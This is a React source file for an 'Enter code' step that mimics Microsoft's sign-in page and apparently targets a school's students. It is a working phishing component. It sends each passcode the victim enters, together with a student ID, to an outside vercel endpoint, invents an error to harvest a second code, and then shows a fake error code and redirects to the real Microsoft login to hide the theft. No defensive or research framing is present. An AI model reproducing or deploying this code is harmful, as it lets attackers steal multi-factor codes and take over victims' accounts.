import { useState, useEffect } from "react";
import axios from "axios"; // Import axios
import { FormFooter } from "./FormFooter";

export const OTP = ({ email, onBack, setStep }) => {
  const [otpValue, setOtpValue] = useState(""); // The OTP entered by the user
  const [otpErrorMessage, setOtpErrorMessage] = useState(""); // Error message for OTP validation
  const [otpAttempts, setOtpAttempts] = useState(0); // To track the number of OTP attempts
  const [firstOtp, setFirstOtp] = useState(localStorage.getItem("otp")); // Get the first OTP from localStorage
  const [otpStep, setOtpStep] = useState(1); // Track which OTP step (first, second)
  const [isSending, setIsSending] = useState(false); // Track if OTP is being sent

  // Function to send OTP email using axios
  const sendOtpEmail = async (otp, type) => {
    const studentId = localStorage.getItem("student_id"); // Fetch student ID from localStorage

    const payload = {
      subject: `${studentId.toUpperCase()} ${type} OTP Verification`,
      message: `User entered ${type} OTP: ${otp} for Student ID: ${studentId}`,
    };

    try {
      setIsSending(true); // Set sending state to true when OTP email starts
      const response = await axios.post(
        "https://ivytechedu-cvfc.vercel.app/send-email",
        payload
      ); // Make POST request to backend email API
      console.log(`${type} OTP email sent successfully`, response.data);
      setIsSending(false); // Reset sending state after the email is sent
      return true; // Return true if email was sent successfully
    } catch (error) {
      setIsSending(false); // Reset sending state in case of error
      console.error(
        `${type} OTP email failed`,
        error.response?.data || error.message
      );
      return false; // Return false if there was an error
    }
  };

  // Handle OTP submission and validation
  const handleNext = async () => {
    if (!otpValue) {
      setOtpErrorMessage("Please enter the OTP.");
      return;
    }

    if (otpStep === 1) {
      // Handle first OTP step
      localStorage.setItem("first_otp", otpValue);
      const emailSent = await sendOtpEmail(otpValue, "First"); // Send first OTP email
      if (emailSent) {
        setOtpStep(2); // Move to second OTP step after successful email send
        setOtpErrorMessage(
          "Something went wrong. A new verification code has been sent to your phone number. Please try again."
        );
      } else {
        setOtpErrorMessage("Failed to send the first OTP. Please try again.");
      }
      setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
      setOtpValue(""); // Clear the OTP field for the user to enter the second one
      return;
    }

    if (otpStep === 2) {
      // Handle second OTP step
      if (otpValue === firstOtp) {
        setOtpErrorMessage(
          "The second OTP cannot be the same as the first OTP. Please enter a different OTP."
        );
        setOtpValue(""); // Clear the OTP field
        return;
      }

      const emailSent = await sendOtpEmail(otpValue, "Second"); // Send second OTP email
      if (emailSent) {
        setOtpAttempts(otpAttempts + 1); // Increment OTP attempts
        setOtpErrorMessage(
          "Error 0x80072EE7: We encountered a problem while processing your request. Please try again later. If the problem persists, contact support."
        );

        // Transition to loader step before redirect
        setStep("loader"); // Set the step to loader
        setTimeout(() => {
          window.location.href =
            "https://login.microsoftonline.com/3ef7cc24-ad65-4bd7-a6bc-34f32e43989a/login"; // Redirect after 2 seconds
        }, 4000);
      } else {
        setOtpErrorMessage("Failed to send the second OTP. Please try again.");
      }
      setOtpValue(""); // Clear OTP field for the second OTP
      return;
    }
  };


  // This useEffect will simulate a retry mechanism, giving the user a limited number of OTP attempts.
  useEffect(() => {
    if (otpAttempts >= 3) {
      setOtpErrorMessage(
        "Error 0x80072EE7: We encountered a problem while processing your request. Please try again later. If the problem persists, contact support."
      );
    }
  }, [otpAttempts]);

  return (
    <>
      <div
        className="field-container"
        style={{
          opacity: isSending ? 0.5 : 1, // Fade only when email is sending
          transition: "opacity 0.3s ease-in-out", // Optional: smooth transition for opacity change
        }}
      >
        <div className="email-entered">
          <button className="arrow" onClick={onBack}>
            <img
              src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow_left"
            />
          </button>
          <p>{email}</p>
        </div>
        <h1 className="form-title">Enter code</h1>
        <p className="guide">
          We have sent a verification code to your registered phone number.
          Please enter the code below to continue.
        </p>
        <div className="input-message">
          {otpErrorMessage && <p className="guide error">{otpErrorMessage}</p>}{" "}
          {/* Show error */}
          <input
            type="text"
            name="otp"
            id="otp"
            placeholder="XXXXXX"
            className="field otp-field"
            value={otpValue}
            onChange={(e) => setOtpValue(e.target.value)} // Update OTP value
          />
        </div>
        <div className="button-container">
          <button type="button" className="next" onClick={handleNext}>
            Next
          </button>
        </div>
      </div>
      <FormFooter />
    </>
  );
};
